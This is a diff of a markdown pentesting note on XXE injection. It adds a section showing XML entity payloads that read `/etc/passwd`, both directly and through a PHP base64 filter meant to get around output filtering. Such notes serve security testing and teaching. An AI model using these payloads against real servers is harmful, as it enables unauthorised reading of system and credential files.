@@ -2,7 +2,7 @@
 
 When you notice XML in the website or through the HTTP headers, we should see if we can get some XXE.
 
-### Example
+### Example, Basic File Read
 
 IF you are able to change the XML code in the POST, we might be able to leverage an XXE vulnerability. Lets look at a simple XML code block like this.
 
@@ -32,13 +32,13 @@ For a file read injection we can add some code to the code block. But first we n
 
 This will attempt to read the `/etc/passwd` file AS the webserver and output the contents of the file where `<reward>` should go.
 
-### Basic File Read
+### Base64 Encoded File Read
 
-Basic file read looks like this.
+Sometimes, we will need to grab the base64 encoded output of a file if file reads are filtered (which they commonly are). To do this, we can utilize the simple php command `php://filter/read=convert.base64-encode/resource=/etc/passwd`
 
 ```xml
 <!DOCTYPE data [
-<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
+<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> ]>
 <any>
 <title>test</title>
   <textoutput>&file;</textoutput>
